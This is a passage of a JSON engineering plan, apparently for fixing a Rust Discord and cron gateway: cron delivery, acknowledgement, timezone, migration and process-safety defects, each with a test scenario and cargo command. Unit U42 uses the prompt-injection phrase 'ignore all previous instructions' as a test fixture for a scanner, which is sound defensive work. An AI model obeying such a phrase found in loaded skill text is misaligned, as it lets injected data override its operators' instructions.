+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | D16 | P2 forum; PNG tables invariant | FIX | Table conversion PRESENT R:1875-1879,1947 and table_render/mod.rs:280-311. Forum SendMessage returns R:1991 before attachment branch, so table replaced by placeholder but PNG never uploaded. All tables sent in one attachment request R:1884-1893,2070-2080; 11 tables exceeds Discord's 10-file cap; failure logged then Ok, leaving all tables missing. H:3336-3380 batches images by 10 and forum-file path H:3007-3063 preserves attachments. |",
+      "scenario": "| D16 | R table attachment dispatch branches: carry PNGs into forum starter/child, groups <=10, propagate errors or retain original table on failure. | `cargo test --test test_discord_adapter tables_survive_forum_and_attachment_limits` : 11 distinct tables, forum target and ordinary final Stream. RED zero/forum or rejected11 upload followed by Ok -> all11 PNGs across valid requests; forced upload failure not acknowledged as fully delivered. |",
+      "redCommand": "cargo test --test test_discord_adapter tables_survive_forum_and_attachment_limits"
+    },
+    {
+      "id": "U36",
+      "title": "Live durable outbound obligations",
+      "findings": [
+        "CR.C01",
+        "S.F13"
+      ],
+      "files": [
+        "src/ledger/service.rs",
+        "src/main.rs",
+        "src/agent/omo_backend.rs",
+        "src/discord/adapter.rs",
+        "src/cron/scheduler.rs",
+        "migrations/0020_obligation_owner.sql"
+      ],
+      "tests": [
+        "tests/test_cron_egress_parity.rs",
+        "tests/test_omo_backend.rs"
+      ],
+      "dependsOn": [
+        "U16",
+        "U22",
+        "U29",
+        "U30",
+        "U33",
+        "U35"
+      ],
+      "category": "deep",
+      "reason": "Cross-cutting state/protocol contract must remain coherent; split unrelated findings into other units.  Source evidence: | C01 | P0 #8 durable outbound obligations | FIX | `src/ledger/service.rs:198-353`; `src/main.rs:301-365,1297`; `src/agent/omo_backend.rs:658-677`; `src/cron/scheduler.rs:1177-1201` | `gateway/delivery_ledger.py:1-37,153-289` | Ledger and boot sweep exist, but repository callers of `record_obligation` are tests only. Actual final stream and script send never record owed output. Crash loses it; backend also returns success after final dispatch error. Sweep uses PID alone (no start stamp), so reused live PID strands old obligations; no terminal-obligation pruning exists (Hermes bounds retention/rows at delivery_ledger.py:292-322). | | F13 | Delivery success ACK (P0 #8 cross-lane finding) | FIX P0 | `omo_backend.rs:659-677` ignores failed final emit, persists assistant and returns Ok; actor clears pending and marks delivered (`actor.rs:212-226,358-365`). Existing `test_omo_backend_skips_ack_when_delivery_fails` explicitly expects this false success (`tests/test_omo_backend.rs:1752-1792`). `record_obligation` callers are tests only (`ledger/service.rs:198`, `main.rs:1705,1715`), so boot sweep cannot recover live responses. H: `session.py:2682-2703` commit-on-persistence contract; outbound ledger implementation ownership is lead/egress, do not double-count there. |",
+      "scenario": "| C01 | Record stable run/turn+destination obligation before final send; retain failures; do not report failed dispatch as success. `cargo test --test test_cron_egress_parity cron_final_obligation_recovers` | Final `report-17`, interrupt at pre-send event, reconstruct sender over same DB: RED zero recoverable rows -> GREEN one recoverable row and one confirmed recovered delivery. Exercise both WS agent and script scheduler output. Preserve bot identity in recovery; add owner start-stamp and retention bounds. Separate fixture with recycled live PID/old start stamp must recover, and expired terminal rows must prune. |\n\n| F13 | B with lead outbox integration: return final-dispatch failure; persist live obligation before send, mark after actual ACK. `cargo test --test test_omo_backend failed_final_delivery_is_not_acknowledged` | final OK, dispatcher returns send error. RED backend Ok/ledger delivered/no obligation; GREEN failed/pending retryable delivery and no cron ack. QA real mux+SQLite+failing transport; reboot sweep sends same obligation, not rerun agent. Existing contrary test must be deliberately updated. |",
+      "redCommand": "cargo test --test test_cron_egress_parity cron_final_obligation_recovers && cargo test --test test_omo_backend failed_final_delivery_is_not_acknowledged"
+    },
+    {
+      "id": "U37",
+      "title": "Scheduler-owned agent and gate results",
+      "findings": [
+        "CR.C02",
+        "CR.C05"
+      ],
+      "files": [
+        "src/main.rs",
+        "src/agent/backend.rs",
+        "src/agent/omo_backend.rs",
+        "src/cron/scheduler.rs"
+      ],
+      "tests": [
+        "tests/test_cron_executor_parity.rs"
+      ],
+      "dependsOn": [
+        "U26",
+        "U36"
+      ],
+      "category": "deep",
+      "reason": "Cross-cutting state/protocol contract must remain coherent; split unrelated findings into other units.  Source evidence: | C02 | P0 #13; P1 silence; P2 agent fanout/mirroring | FIX | `src/main.rs:553-604,675-705`; `src/agent/omo_backend.rs:363-368,623-677`; `src/discord/adapter.rs:1842-1912`; `src/cron/scheduler.rs:1113-1137` | `cron/scheduler.py:3795-3866` | Agent emits directly and executor returns `None`; scheduler never receives final text. Hermes goes through scheduler save/filter/deliver. Rust posts `[SILENT]`/`NO_REPLY`, synthesizes Done for tool-only output, delivers only first Hermes destination, and bypasses delivery mirroring. Native comma target becomes invalid channel string. Local agent jobs still attempt Discord dispatch to job ID (numeric IDs can be actual channels). | | C05 | P1 wakeAgent; P0 #13 pre-run silence | FIX | `src/main.rs:492-505,651-672`; `src/cron/scheduler.rs:1115-1127` | `cron/scheduler.py:2363-2386,2690-2697,2748-2776` | Hermes no_agent returns before gate in Rust, delivering false-gate JSON; no_agent without script silently succeeds. Empty successful precheck still invokes agent. Executor `None` can resurrect payload notification/content even when wake gate explicitly suppressed execution. |",
+      "scenario": "| C02 | Return explicit cron execution result without direct backend emission; scheduler owns filtering/fanout/mirror. `cargo test --test test_cron_executor_parity agent_result_uses_scheduler_delivery` | Hermes deliver `discord:42,discord:43`, WS final `[SILENT]`, then ordinary report in separate case: RED sentinel send / one report target -> GREEN zero sentinel sends / both report targets. Native/local variants must make zero Discord calls. |\n\n| C05 | Gate successful script stdout before no_agent return; distinguish silent vs fallback; reject no_agent without script. `cargo test --test test_cron_executor_parity script_gate_is_silent_in_both_modes` | `no_agent:true`, stdout `{\"wakeAgent\":false}`, content=`fallback`: RED outgoing JSON/fallback -> GREEN no backend/send/ACK. Empty stdout with nonempty prompt: RED backend run -> GREEN no backend run. Use harmless printf script fixture. |",
+      "redCommand": "cargo test --test test_cron_executor_parity agent_result_uses_scheduler_delivery && cargo test --test test_cron_executor_parity script_gate_is_silent_in_both_modes"
+    },
+    {
+      "id": "U38",
+      "title": "Atomic finite occurrence budget",
+      "findings": [
+        "CR.C03"
+      ],
+      "files": [
+        "src/cron/scheduler.rs"
+      ],
+      "tests": [
+        "tests/test_cron_schedule_parity.rs"
+      ],
+      "dependsOn": [
+        "U37"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | C03 | P0 #14 finite repeat; retry/recovery/idempotency | FIX | `src/cron/scheduler.rs:695-795,918-969,1019-1103` | `cron/jobs.py:1545-1570,1610-1664,1705-1731`; `cron/executions.py:156-181` | Only success increments completed. Recurring failures never exhaust finite runs. Claims neither consume one-shot budget nor advance recurring schedule before side effects; dead-owner reclaim repeats ambiguous work. Explicit trigger increments count but ignores limit; no preclaim limit check prevents further runs. |",
+      "scenario": "| C03 | Consume finite budget and provisionally advance schedule atomically before side effects; record ambiguous interruption distinctly, no automatic replay of same occurrence. `cargo test --test test_cron_schedule_parity finite_budget_survives_failure_and_restart` | `interval:1m`, repeat `{times:2,completed:0}`, executor error twice; RED enabled/count=0 -> GREEN exhausted/count=2. One-shot repeat=1 interrupted after side-effect signal then expired-owner recovery: RED second execution -> GREEN no second execution. Trigger exhausted job likewise rejected. |",
+      "redCommand": "cargo test --test test_cron_schedule_parity finite_budget_survives_failure_and_restart"
+    },
+    {
+      "id": "U39",
+      "title": "Profile-scoped persistent cron results",
+      "findings": [
+        "CR.C04"
+      ],
+      "files": [
+        "src/cron/scheduler.rs",
+        "src/main.rs",
+        "migrations/0021_cron_outputs.sql"
+      ],
+      "tests": [
+        "tests/test_cron_schedule_parity.rs"
+      ],
+      "dependsOn": [
+        "U37",
+        "U38"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | C04 | P1 context_from; persistent local output | FIX | `src/cron/scheduler.rs:110-176,1106-1140`; `src/main.rs:531-541,553-578`; `src/agent/omo_backend.rs:764-778` | `cron/scheduler.py:2389-2434,3801`; `cron/jobs.py:2208` | Script-only/local results have no output persistence. DB lookup uses unscoped suffix LIKE, not job/profile provenance; real origin user replaces cron job user, so predecessor may be unfindable. `%`/`_` are allowed and act as SQL wildcards; identical job IDs in profiles leak context. Fallback reads global home after profile-local miss. |",
+      "scenario": "| C04 | Persist output by exact profile/job/run independently of delivery, query it rather than session suffix/global fallback. `cargo test --test test_cron_schedule_parity predecessor_is_profile_scoped` | A/B profiles both job `abc123`, outputs `A`/`B`, downstream A `context_from:[\"abc123\"]`: RED missing/B result -> GREEN exact A; script-local predecessor also retrievable. `%` job reference must never match unrelated output. QA run producer then consumer through scheduler. |",
+      "redCommand": "cargo test --test test_cron_schedule_parity predecessor_is_profile_scoped"
+    },
+    {
+      "id": "U40",
+      "title": "Skill-only jobs and slash bundles",
+      "findings": [
+        "CR.C06"
+      ],
+      "files": [
+        "src/main.rs"
+      ],
+      "tests": [
+        "tests/test_cron_executor_parity.rs"
+      ],
+      "dependsOn": [
+        "U37",
+        "U39"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | C06 | P1 missing skill; P2 skill bundle | FIX | `src/main.rs:502-505,708-735,745-759,801-839` | `cron/scheduler.py:2339-2352,2451-2540`; `agent/skill_bundles.py:1-38` | Promptless skill-only jobs rejected before loading any skill. Missing skills with real prompt already warn/continue, but helper coverage hides precheck. `/bundle` is rejected as absolute path rather than normalizing slash command; Hermes explicitly strips slash. |",
+      "scenario": "| C06 | Permit valid skill-only task and normalize bundle slash; validate effective task after resolution. `cargo test --test test_cron_executor_parity skill_only_bundle_runs` | prompt=`\"\"`, skills=`[\"/bundle\"]`, manifest skills `[\"member\"]`, real SKILL.md: RED executor error -> GREEN one backend turn with resolved member. Missing optional skill plus normal task continues. |",
+      "redCommand": "cargo test --test test_cron_executor_parity skill_only_bundle_runs"
+    },
+    {
+      "id": "U41",
+      "title": "Shared lifecycle guard on resolved scripts",
+      "findings": [
+        "CR.C07"
+      ],
+      "files": [
+        "src/cron/guard.rs",
+        "src/cron/store.rs",
+        "src/main.rs",
+        "src/dashboard.rs",
+        "src/cron/scheduler.rs",
+        "src/tools/cron.rs"
+      ],
+      "tests": [
+        "tests/test_cron_boundary_parity.rs"
+      ],
+      "dependsOn": [
+        "U03",
+        "U39",
+        "U40"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | C07 | P1 lifecycle footgun guard | FIX | `src/cron/guard.rs:5-29`; `src/cron/store.rs:405-413`; `src/main.rs:1024-1086`; `src/dashboard.rs:1244-1316`; `src/cron/scheduler.rs:534-599` | `cron/lifecycle_guard.py:49-66,76-141` | Import scans script filename, never file body; executor runs resolved file unchecked. Dashboard register bypasses guards altogether, including ack_command. Conversely all launchctl kickstart and systemctl restart commands are blocked even for unrelated services; unrelated omon prose can match broad restart regex. |",
+      "scenario": "| C07 | Central validate every mutation; scan resolved script bytes again before spawn; check ACK; narrow target-specific lifecycle patterns. `cargo test --test test_cron_boundary_parity lifecycle_guard_covers_rest_and_script_body` | REST payload script=`launchctl kickstart gui/501/omon-gateway` and imported `restart.sh` containing same: RED accepted/spawnable -> GREEN rejected before spawn. `launchctl kickstart gui/501/com.example.worker` must be accepted. Never execute lifecycle fixture. |",
+      "redCommand": "cargo test --test test_cron_boundary_parity lifecycle_guard_covers_rest_and_script_body"
+    },
+    {
+      "id": "U42",
+      "title": "Two-tier assembled cron scanning",
+      "findings": [
+        "CR.C08"
+      ],
+      "files": [
+        "src/security/scan.rs",
+        "src/cron/store.rs",
+        "src/main.rs",
+        "src/dashboard.rs",
+        "src/tools/cron.rs"
+      ],
+      "tests": [
+        "tests/test_cron_boundary_parity.rs"
+      ],
+      "dependsOn": [
+        "U41"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | C08 | P1 cron injection scanner | FIX | `src/tools/cron.rs:330-345,438-452`; `src/security/scan.rs:65-140`; `src/main.rs:531-600`; `src/cron/store.rs:405-418` | `cron/scheduler.py:2543-2600,2883-2899`; `tools/cronjob_tools.py:78-103` | Create/update scanner exists only on CronTool raw prompt. Imported jobs, REST payloads, loaded skills and predecessor/script data reach backend without assembled-prompt scanning. Do not reuse strict command scanner on legitimate injected data; Hermes uses two tiers. |",
+      "scenario": "| C08 | Strict raw directive scan plus loose runtime assembled-data scan at shared boundary. `cargo test --test test_cron_boundary_parity imported_skill_injection_is_blocked` | Imported prompt=`summarize`, skill contains `ignore all previous instructions`: RED backend receives it -> GREEN blocked with zero turn/start. Legitimate data quoting a command must remain accepted. QA imported job through sync + executor. |",
+      "redCommand": "cargo test --test test_cron_boundary_parity imported_skill_injection_is_blocked"
+    },
+    {
+      "id": "U43",
+      "title": "Canonical Discord home and fanout targets",
+      "findings": [
+        "CR.C10",
+        "CFG.C10"
+      ],
+      "files": [
+        "src/cron/store.rs",
+        "src/cron/scheduler.rs",
+        "src/main.rs"
+      ],
+      "tests": [
+        "tests/test_cron_boundary_parity.rs"
+      ],
+      "dependsOn": [
+        "U41",
+        "U42"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | C10 | P2 fanout target parsing | FIX | `src/cron/store.rs:164,221-278,316-337`; `src/cron/scheduler.rs:1290-1350`; `src/main.rs:675-685` | `cron/scheduler.py:1136-1297`; `gateway/delivery.py:161-205` | `all`/bare discord use origin only, not configured home fallback. `discord:42:43` remains chat_id `42:43` and fails numeric parse. Uppercase platform ignored. Imported array deliver fails whole-document deserialization despite native array support. | | C10 | FIX P1/P2; P2 cron fan-out (partial) | `store.rs:216-274`; `main.rs:557`; `scheduler.rs:1170-1190`; H:`cron/scheduler.py:1136-1297`; H:`gateway/config.py:1756-1763` | `discord`/`all`/missing-origin only use origin, never configured Discord home. No-origin `deliver:discord` silently yields no target despite home channel 42. `all` does not expand configured homes. Explicit thread references/name labels are treated as raw channel text. Non-Discord exclusions do not justify losing the Discord member of fan-out. |",
+      "scenario": "| C10 | Shared normalized target parser with explicit channel/thread and configured Discord home expansion; isolate malformed record. `cargo test --test test_cron_boundary_parity target_forms_resolve` | Hermes deliver `[\"Discord:42:43\",\"all\"]`, configured home=44: RED document error/invalid ID/no home -> GREEN destinations `(42,43),(44,None)`; QA import then script dispatch to HTTP capture. Implement with C store boundary package. |\n\n- **C10:** Resolve source-profile Discord home/thread and canonical target refs for origin/discord/all; keep explicit fan-out dedup. Scope store destination resolver plus call sites receiving config. `cargo test --lib cron::store::tests::discord_delivery_uses_profile_home`. Payload home42/thread43, no origin, deliver discord then all. RED zero targets; GREEN exactly (42,43). QA script-only fixture job plus recording dispatcher, assert one correct destination without external send.",
+      "redCommand": "cargo test --test test_cron_boundary_parity target_forms_resolve && cargo test --lib cron::store::tests::discord_delivery_uses_profile_home"
+    },
+    {
+      "id": "U44",
+      "title": "Aggregate delivery receipts before ACK",
+      "findings": [
+        "CR.C11"
+      ],
+      "files": [
+        "src/cron/scheduler.rs",
+        "src/cron/ack.rs",
+        "src/discord/adapter.rs"
+      ],
+      "tests": [
+        "tests/test_cron_delivery_parity.rs"
+      ],
+      "dependsOn": [
+        "U31",
+        "U35",
+        "U36",
+        "U37",
+        "U43"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | C11 | ACK, partial fanout, delivery failure | FIX | `src/cron/scheduler.rs:1129-1152,1177-1224`; `src/cron/ack.rs:38-61`; `src/discord/adapter.rs:1927-1933,2070-2078` | `cron/scheduler.py:1368-1387,1530-1532,2011-2013`; `gateway/delivery.py:266-313` | ACK executes per destination, including error-alert sends. First good destination ACKs before later failure; first failure aborts remaining success targets. Dead-target skip returns Ok, so no delivered message can still commit producer checkpoint/mirror. PNG attachment failure is logged then success returned. ACK extension has no direct Hermes equivalent; confirmed-delivery semantics still apply. |",
+      "scenario": "| C11 | Aggregate per-target receipts, attempt all targets; ACK once only for successful intended output, never error/silence/skips; wire media extraction/upload and propagate attachment failure. `cargo test --test test_cron_delivery_parity ack_requires_complete_output_delivery` | Deliver 42,43; 42 succeeds,43 fails; ACK=`printf ack` captured safely: RED ACK before failure -> GREEN ACK count 0. All success -> exactly 1. Executor error alert -> 0. Media=`MEDIA:<temp>/a.png`: RED literal/no upload -> GREEN attachment upload; failed upload => no ACK. |",
+      "redCommand": "cargo test --test test_cron_delivery_parity ack_requires_complete_output_delivery"
+    },
+    {
+      "id": "U45",
+      "title": "Exact reminder and mirror identity",
+      "findings": [
+        "CR.C14",
+        "R.R12"
+      ],
+      "files": [
+        "src/mirror.rs",
+        "src/models/session.rs",
+        "src/tools/cron.rs",
+        "src/cron/scheduler.rs",
+        "src/main.rs"
+      ],
+      "tests": [
+        "tests/test_cron_egress_parity.rs"
+      ],
+      "dependsOn": [
+        "U20",
+        "U36",
+        "U42",
+        "U43",
+        "U44"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | C14 | P2 cron mirroring; multi-bot identity | FIX | `src/cron/scheduler.rs:1180-1189,1231-1276`; `src/mirror.rs:61-121`; `src/tools/cron.rs:111-127`; `src/main.rs:308-326,553-578`; `src/models/session.rs:24-42` | `cron/scheduler.py:656-757` | Created reminder drops bot/thread delivery coordinates; all newly built delivery/recovery keys have bot_id None => default bot. Explicit source session is reused for every fanout mirror, regardless of destination; fallback can pick another bot/thread's latest session. Existing origin.user_id also makes cron jobs share backend thread/cache identity instead of cron isolation. | | R12 | P2 cron session mirroring / target isolation | FIX P1 | `src/mirror.rs:62-119`; caller `src/cron/scheduler.rs:1202-1217,1230-1272` | `H:gateway/mirror.py:99-185`: if requested thread has no match, lookup broadens to user/channel, including unrelated threads; neither branch disambiguates bot-scoped sessions. Most-recent row receives content for another target. Existing precedence test asserts only positive cases and accepts any channel match. Feature exists but target isolation fails. Cron role choice is reported to cron/output owner; independent-agent transcript consumption is not expanded here. |",
+      "scenario": "| C14 | Persist exact bot/channel/thread identity; destination-specific mirror lookup, never arbitrary latest session; use independent cron execution identity. `cargo test --test test_cron_egress_parity reminder_retains_bot_and_thread` | Create from bot B channel42/thread43 with bot A default; RED A/42 or unrelated mirror -> GREEN B/43 and only matching transcript; repeat after recovery. Second fanout destination must not be mirrored into source twice. |\n\n- **R12 / G:** never broaden an explicit thread target; return no match on ambiguous bot/user candidates rather than newest guessed row. `cargo test --lib mirror_refuses_wrong_thread_and_ambiguous_bot -- --nocapture`. Payload: c1/t1 bot A and c1/t2 bot B; target c1/t3 (missing), then c1 without bot disambiguation. RED wrong transcript changes; GREEN false/no writes. QA: call actual cron delivery mirror seam with real SQLite and recording outbound delivery; matching exact job session key remains supported. Existing `test_find_session_by_origin_precedence` and scheduler `test_mirror_cron_delivery_to_session` cover positives only.",
+      "redCommand": "cargo test --test test_cron_egress_parity reminder_retains_bot_and_thread && cargo test --lib mirror_refuses_wrong_thread_and_ambiguous_bot -- --nocapture"
+    },
+    {
+      "id": "U46",
+      "title": "Validated timezone-aware schedules",
+      "findings": [
+        "CR.C15",
+        "CFG.C09"
+      ],
+      "files": [
+        "src/cron/store.rs",
+        "src/cron/scheduler.rs",
+        "Cargo.toml",
+        "Cargo.lock"
+      ],
+      "tests": [
+        "tests/test_cron_schedule_parity.rs"
+      ],
+      "dependsOn": [
+        "U39",
+        "U43",
+        "U45"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | C15 | persistent schedule interpretation | FIX | `src/cron/store.rs:193-212,426-431`; `src/cron/scheduler.rs:1361-1414` | `cron/jobs.py:720-778` | Imported cron expression is evaluated against DateTime<Utc> after first completion, dropping Hermes configured timezone. Stored next_run_at initially works, then e.g. 09:00 Seoul becomes 09:00 UTC. No timezone field is consumed. | | C09 | FIX P1; new cron import schedule fidelity | `store.rs:188-213,426-431`; `scheduler.rs:1377-1410`; H:`cron/jobs.py:720-777`; H:`hermes_time.py:37-75,122-133` | `next_run(...).ok()` swallows malformed/unsupported schedules into enabled rows with NULL next-run; cutover accepts them by ID. A stored next_run bypasses schedule validation entirely. Cron recurrence always uses UTC whereas Hermes uses configured/local timezone; a 09:00 Seoul job may retain first instant then move to 18:00 Seoul. Interval recovery ignores last_run_at when next_run_at is missing. |",
+      "scenario": "| C15 | Persist/import timezone and evaluate cron wall-clock schedule there, convert next instant to UTC only for storage. `cargo test --test test_cron_schedule_parity imported_cron_retains_timezone` | profile Asia/Seoul, `0 9 * * *`, completion `2026-09-05T00:01:00Z`: RED next `09:00Z` -> GREEN `2026-09-06T00:00:00Z`. QA import/run/completion/reload using injected fixed clock. |\n\n- **C09:** Validate full expression before insertion and propagate errors; persist configured source timezone and recurrence anchor. Scope store expression/next-run import and scheduler timezone recurrence. `cargo test --lib cron::store::tests::imports_timezone_and_rejects_invalid_schedule`. Payload expr `garbage`; separate 09:00 Asia/Seoul after `2026-09-05T00:00:00Z`. RED NULL enabled row / next09:00Z; GREEN rejection before cutover / next `2026-09-06T00:00:00Z`. QA synthetic import, explicit-clock next-run evaluation twice including DST zone case, no timed waiting.",
+      "redCommand": "cargo test --test test_cron_schedule_parity imported_cron_retains_timezone && cargo test --lib cron::store::tests::imports_timezone_and_rejects_invalid_schedule"
+    },
+    {
+      "id": "U47",
+      "title": "Bad-job isolation and explicit rearming",
+      "findings": [
+        "CR.C16"
+      ],
+      "files": [
+        "src/cron/store.rs",
+        "src/cron/scheduler.rs"
+      ],
+      "tests": [
+        "tests/test_cron_boundary_parity.rs"
+      ],
+      "dependsOn": [
+        "U43",
+        "U46"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | C16 | persistent sync isolation / rearming | FIX | `src/cron/store.rs:316-337,393-443`; `src/main.rs:1293-1295`; `src/cron/scheduler.rs:494-502` | `cron/jobs.py:1930-1935,1960-1989`; `cron/executions.py:156-181` | One malformed job/store aborts full sync and startup, not just bad job. Old once NULL-state preservation runs before detecting changed expression/time, so operator rearm remains disabled. Finite exhausted state similarly prevents increased repeat limit. Runtime last_status/last_error/last_delivery_error payload fields never updated; only cron_runs carries current state. |",
+      "scenario": "| C16 | Isolate invalid records/profiles, preserve healthy boot; distinguish operator rearm from unchanged terminal import; expose current run/delivery state. `cargo test --test test_cron_boundary_parity sync_isolates_bad_jobs_and_rearms_changed_once` | One valid job plus malformed schedule; RED sync/boot error -> GREEN valid job available + invalid diagnostic. Completed once changed to future run_at: RED disabled -> GREEN enabled future next time. Increase finite limit likewise; fetched status reflects latest execution. |",
+      "redCommand": "cargo test --test test_cron_boundary_parity sync_isolates_bad_jobs_and_rearms_changed_once"
+    },
+    {
+      "id": "U48",
+      "title": "Truthful complete CronTool mutations",
+      "findings": [
+        "CR.C09"
+      ],
+      "files": [
+        "src/tools/cron.rs",
+        "src/main.rs",
+        "src/dashboard_runtime.rs"
+      ],
+      "tests": [
+        "tests/test_cron_tool_parity.rs"
+      ],
+      "dependsOn": [
+        "U19",
+        "U45"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | C09 | P1 CronTool operations / read-only ownership | FIX | `src/main.rs:1222`; `src/dashboard_runtime.rs:103`; `src/tools/cron.rs:177-314,353-403,460-485`; `src/cron/store.rs:439-460` | `cron/jobs.py:1333-1499`; `cron/scheduler_provider.py:85-112` | Production constructs scheduler-less tool: trigger only rewrites next_run_at, does nothing for paused jobs and consumes scheduled one-shot on next poll. Imported jobs advertise read-only but mutations succeed and next sync resurrects delete/overwrites pause/update. Create drops repeat/context_from/skills/no_agent/ack/timeout/model and ignores enabled:false; update always recomputes next time even for name-only change. |",
+      "scenario": "| C09 | Bind scheduler, enforce imported read-only, preserve recognized arguments, recompute schedule only when schedule changes. `cargo test --test test_cron_tool_parity mutations_preserve_contract` | Add `enabled:false,repeat:{times:2},context_from:[\"abc\"]`; RED enabled/dropped fields -> GREEN preserved. Pause then trigger: RED no execution -> GREEN one manual run/no schedule consumption. Imported delete must error, not say deleted then resurrect. Name-only update preserves timestamp. |",
+      "redCommand": "cargo test --test test_cron_tool_parity mutations_preserve_contract"
+    },
+    {
+      "id": "U49",
+      "title": "Cron runs and status tool surface",
+      "findings": [
+        "CR.C17"
+      ],
+      "files": [
+        "src/tools/cron.rs",
+        "src/cron/scheduler.rs"
+      ],
+      "tests": [
+        "tests/test_cron_tool_parity.rs"
+      ],
+      "dependsOn": [
+        "U47",
+        "U48"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | C17 | P1 CronTool runs/status | FIX (feature gap) | `src/tools/cron.rs:60-64,132-502`; `src/dashboard.rs:1404-1453` | `cron/executions.py:184-228`; `cron/jobs.py:809-855` | Dashboard run history exists; CronTool accepts neither runs nor status. No ticker heartbeat/success state exposed there. Historical claim that only list/get/add/delete exist is false; remaining observability feature is specifically this interface. |",
+      "scenario": "| C17 | Add bounded runs/status tool operations against existing run store and ticker health. `cargo test --test test_cron_tool_parity runs_and_status_are_exposed` | `{\"action\":\"runs\",\"id\":\"j\"}` with one seeded attempt; RED unknown action -> GREEN one structured attempt; status reports running/paused and ticker health. QA actual Tool.execute surface, no prose assertion. |",
+      "redCommand": "cargo test --test test_cron_tool_parity runs_and_status_are_exposed"
+    },
+    {
+      "id": "U50",
+      "title": "Private atomic unique migration writes",
+      "findings": [
+        "CFG.C05"
+      ],
+      "files": [
+        "src/migrate/sys.rs",
+        "src/migrate/config_import.rs",
+        "src/migrate/cron_cutover.rs"
+      ],
+      "tests": [
+        "tests/test_migrate.rs"
+      ],
+      "dependsOn": [],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | C05 | FIX P0/P1; new secure/atomic persistence | `config_import.rs:106-119,458-463`; `src/migrate/sys.rs:80-81`; H:`hermes_cli/profiles.py:1115-1124`; H:`hermes_cli/config.py:7125-7146` | `std::fs::write` creates secret-bearing target AND backup using umask (0644 under 022); copying a 0600 original does not copy permissions. Target rewrite truncates in place, so interrupted write corrupts active config. Second migration within the same second overwrites the only `.bak-YYYY...SSZ` backup. Cron backups use the same unprotected write primitive. |",
+      "scenario": "- **C05:** Exclusive unique backups, 0600 files, same-directory atomic target replacement; preserve original on failure. Scope secure OS write API and importer/cron backup call sites. `cargo test --test test_migrate secret_files_are_private_and_backup_unique`. Payload 0600 target and two imports at identical injected time; injected failure before rename. RED group/other permission bits or overwritten first backup/truncated target; GREEN all zero, both backups retained, original intact. QA temp directory under umask022 with OsEnv only; stat files; no signals.",
+      "redCommand": "cargo test --test test_migrate secret_files_are_private_and_backup_unique"
+    },
+    {
+      "id": "U51",
+      "title": "Verified safe launchd retirement",
+      "findings": [
+        "CFG.C06"
+      ],
+      "files": [
+        "src/migrate/gateway_down.rs",
+        "src/migrate/sys.rs"
+      ],
+      "tests": [
+        "src/migrate/gateway_down.rs"
+      ],
+      "dependsOn": [
+        "U50"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | C06 | FIX P0; new lifecycle safety | `gateway_down.rs:24-25,48-87,130-139,163-165`; `sys.rs:153-166`; H:`gateway/status.py:2016-2044`; H:`hermes_cli/gateway.py:4318-4345` | Any positive PID in stale JSON is signaled without start-time/process identity/held-lock validation: PID reuse kills unrelated processes. TERM/KILL precede launchd bootout, enabling KeepAlive respawn; immediate post-KILL existence check can spuriously fail before exit. Existing `.plist.disabled` makes discovery skip a live matching `.plist`, leaving service running. Unreadable/malformed lock is silently skipped. |",
+      "scenario": "- **C06:** Validate start-time/identity before any signal; unload matching live service before stopping residual verified PID; await bounded exit; handle existing disabled destination without skipping active service. Scope gateway_down/sys process APIs. `cargo test --lib migrate::gateway_down::tests::stale_pid_never_signaled`. Payload `{pid:4242,start_time:1}` while fake process4242 start2; active plist plus disabled backup. RED signal4242 and/or no bootout; GREEN zero signals to reused PID and bootout active service. QA scripted fake launchd/process lifecycle events, deterministic exit signal, no real launchctl.",
+      "redCommand": "cargo test --lib migrate::gateway_down::tests::stale_pid_never_signaled"
+    },
+    {
+      "id": "U52",
+      "title": "Durable cutover job ownership",
+      "findings": [
+        "CFG.C01"
+      ],
+      "files": [
+        "src/migrate/cron_cutover.rs",
+        "src/cron/store.rs",
+        "src/migrate/mod.rs"
+      ],
+      "tests": [
+        "tests/test_migrate.rs"
+      ],
+      "dependsOn": [
+        "U47",
+        "U50"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | C01 | FIX P0; new migration defect | `src/migrate/mod.rs:174`, `cron_cutover.rs:204-218`; `src/main.rs:1293-1295`; `src/cron/store.rs:445-454`; H:`cron/jobs.py:858-934` | Full cutover empties source stores but leaves `_omon_hermes_source` on imported rows. First normal startup sync sees no live IDs and DELETEs every migrated job; scheduler repeats sync at `scheduler.rs:510`. A successful migration loses its cron schedules on startup. |",
+      "scenario": "- **C01:** Detach imported rows from live-source deletion using durable cutover ownership, atomically before retirement. Scope `cron_cutover.rs`, `store.rs` source-deletion filter, migration persistence/test. Test `cutover_survives_startup_sync`; `cargo test --test test_migrate cutover_survives_startup_sync`. Payload daily job `{\"id\":\"daily\",\"prompt\":\"status\",\"schedule\":{\"kind\":\"cron\",\"expr\":\"0 9 * * *\"}}`. RED count 1 -> 0 after migrate then production synchronizer; GREEN count remains 1 after two syncs. QA fixture migration then exact startup sync and due-job claim, no Discord.",
+      "redCommand": "cargo test --test test_migrate cutover_survives_startup_sync"
+    },
+    {
+      "id": "U53",
+      "title": "Quiesced receipt-verified all-store cutover",
+      "findings": [
